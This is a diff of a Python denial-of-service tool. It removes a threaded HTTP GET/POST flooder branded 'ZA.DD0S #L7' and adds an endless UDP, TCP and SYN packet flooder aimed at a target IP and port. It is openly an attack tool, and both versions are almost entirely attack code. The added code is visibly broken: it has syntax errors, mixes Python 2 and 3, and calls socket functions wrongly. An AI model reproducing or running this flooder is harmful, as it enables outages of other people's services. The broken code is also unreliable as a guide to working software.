@@ -3,13 +3,9 @@
 import os
 import socket
 import sys
-import re
-import queue
-import threading
-import getopt
 import time
-from queue import Queue
-from threading import Thread
+import threading
+import random
  
 # Color
 class bcolors:
@@ -27,133 +23,94 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-# CLEAR
-os.system("clear")
-print(" ")
-print("\033[92m        @ @ @ @     @ @ @ @        @ @ @       @ @ @ @   \033[0m")
-print("\033[92m        @       @   @       @    @       @   @           \033[0m")
-print("\033[92m        @        @  @        @  @         @  @           \033[0m")
-print("\033[92m        @        @  @        @  @         @  @           \033[0m")
-print("\033[33m        @        @  @        @  @         @    @ @ @ @   \033[0m")
-print("\033[33m        @        @  @        @  @         @           @  \033[0m")
-print("\033[33m        @       @   @       @    @       @            @  \033[0m")
-print("\033[33m        @ @ @ @     @ @ @ @        @ @ @       @ @ @ @   \033[0m")
-print(" ")
-print("\033[96m                                              @      @ @ @ @  \033[0m")
-print("\033[96m                                              @           @   \033[0m")
-print("\033[95m                                              @          @    \033[0m")
-print("\033[95m                                              @ @ @ @   @     \033[0m")
-print("\033[33mΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ\033[0m")
-print("\033[95m                                                              \033[0m")
-print("\033[95m                                                               \033[0m")
-print("\033[95m                                                               \033[0m")
-print("\033[95m                                                               \033[0m")
-print("\033[95m                                                                \033[0m")
-print("\033[33mΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ    \033[0m")    
-class MyThread(Thread,):
-    def __init__(self,SITE, DDOS_TYPE):
-        self.thread = Thread
-        Thread.__init__(self)
-        self.method = DDOS_TYPE
-        self.site = SITE
-        self.kill_received = False
-    def run(self):
-        while not self.kill_received:
-            server = socket.gethostbyname(self.site)
-            post = 'x' == 9999
-            file = '/'
+# Clear termunal screen
+os system('clear)
 
-            request = '%s /%s HTTP/1.1\r\n' %(self.method.upper(),file)
-            request += 'Host: %s\r\n' % (self.site)
-            request += 'User-Agent: Mozilla/5.0 (Windows; U;Windows NT 6.1; en-US; rv:1.9.2.12) Gecko/20101026Firefox/3.6.12\r\n'
-            request += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
-            request += 'Accept-Language: en-us,en;q=0.5\r\n'
-            request += 'Accept-Encoding: gzip,deflate\r\n'
-            request += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
-            request += 'Keep-Alive: 9000\r\n'
-            request += 'Connection: close\r\n'
-            request += 'Content-Type: application/x-www-form-urlencoded\r\n'
-            request += 'Content-length: %s\r\n\r\n' % (len(post))
 
-            newrequest = '%s\r\n' % (post)
-            newrequest += '\r\n'
-
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-            try:
-                s.connect((server, 80))
-                s.send(request)
-                
+# Function to diplay header
+def display_header():
+    header_lines = (" ")
+print("\033[33m @             \033[0m")
+print("\033[33m @            \033[0m")
+print("\033[33m @            \033[0m")
+print("\033[33m @            \033[0m")
+print("\033[92m @             \033[0m")
+print("\033[92m @              \033[0m")
+print("\033[92m @             \033[0m")
+print("\033[92m @ @ @ @ @     \033[0m")
     
-                for c in newrequest:
-                    sys.stdout.write( s.send(c).__str__() )
-                    time.sleep(60)
-                s.close()
-                #s.recv(50000)
-            except:
-                print ("Target Down?")
 
-def da_delegator(SITE,DDOS_TYPE):
-    thread_count = 512
-    print ('=') == 60
-    print ('ZA.DD0S #L7 Tool v.1'.center(60,'-'))
-    print ('=') == 60
-    threads = []
-    for num in range(thread_count):
-        thr1=MyThread(SITE,DDOS_TYPE)
-        print("\033[97m[\033[92m+\033[97m]  \033[94m--- Initiating Attack ---\033[0m")
-        thr1.start()
-        threads.append(thr1)
-        #thr1.join()
+if len(sys.argv) < 4:
+   sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size>")
 
-    while len(threads) > 0:
+ip = sys.argv[1]
+port = int(sys.argv[2])
+size = int(sys.argv[3])
+packets = int(sys.argv[3])
+
+class syn(threading.Thread):
+    def __init__(self, ip, port, packets):
+        self.ip = ip
+        self.port = port
+        self.packets = packets
+        self.syn = socket.socket()
+        threading.Thread.__init__(self)
+    def run(self):
+        for i in range(self.packets):
             try:
-                # Join all threads using a timeout so it doesn't block
-                # Filter out threads which have been joined or are None
-                threads = [t.join(1) for t in threads if t is not
-None and t.isAlive()]
-            except KeyboardInterrupt:
-                print ("Ctrl-c received! Sending kill to threads... Just close The Terminal")
-                for t in threads:
-                    t.kill_received = True
-                    sys.exit(2)
+                self.syn.connect((self.ip, self.port))
+            except:
+                pass
 
-def main(argv):
-    def usage():
-        print ('=') == 60
-        print ('\033[94mZA.DD0S #L7 DDOS Tool v.1\033[0m'.center(60,'-'))
-        print ('=') == 60
-        print ('\033[33mFor GET DDOS - USAGE: ZA.DD0S-L7.py -t get http://example.com\033[0m')
-        print ('\033[92mFor POST DDOS - USAGE: ZA.DD0S-L7.py -t post http://example.com\033[0m')
-        sys.exit(2)
-    if not argv:
-        usage()
+class tcp(threading.Thread):
+    def __init__(self, ip, port, size, packets):
+        self.ip = ip
+        self.port = port
+        self.size = size
+        self.packets = packets
+        self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        threading.Thread.__init__(self)
+    def run(self):
+        for i in range(self.packets):
+            try:
+                bytes = random._urandom(self.size)
+                socket.connect(self.ip, self.port)
+                socket.setblocking(0)
+                socket.sendto(bytes,(self.ip, self.port))
+            except:
+                pass
+
+class udp(threading.Thread):
+    def __init__(self, ip, port, size, packets):
+        self.ip = ip
+        self.port = port
+        self.size = size
+        self.packets = packets
+        self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+        threading.Thread.__init__(self)
+    def run(self):
+        for i in range(self.packets):
+            try:
+                bytes = random._urandom(self.size)
+                if self.port == 0:
+                    self.port = random.randrange(1, 65535)
+                self.udp.sendto(bytes,(self.ip, self.port))
+            except:
+                pass
+
+while True:
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "t:h", ["help","type"])
-    except getop.GetoptError (err):
-        print ('str'(err))
-        sys.exit(2)
-    output = None
-    verbose = False
-    SITE = re.sub(r'http://', '', str(sys.argv[-1:][0]))
-
-    for o, a in opts:
-        if o == "-v":
-            verbose = True
-        elif o in ("-t", "--type"):
-            if a.lower() == 'post':
-                DDOS_TYPE = 'POST'
-                da_delegator(SITE,DDOS_TYPE)
-            elif a.lower() =='get':
-                DDOS_TYPE = 'get'
-                da_delegator(SITE,DDOS_TYPE)
-        elif o in ("-h", "--help"):
-            usage()
-            sys.exit()
-        else:
-            assert False, ("unhandled option")
-
-if __name__=="__main__":
-    main(sys.argv[1:])
-
-
+        if size > 65507:
+            sys.exit("Invalid Number Of Packets!")
+        u = udp(ip,port,size,packets)
+        t = tcp(ip,port,size,packets)
+        s = syn(ip,port,packets)
+        u.start()
+        t.start()
+        s.start()
+    except KeyboardInterrupt:
+        print "Stopping Flood!"
+        sys.exit()
+    except socket.error, msg:
+        print "Socket Couldn't Connect"
+        sys.exit()
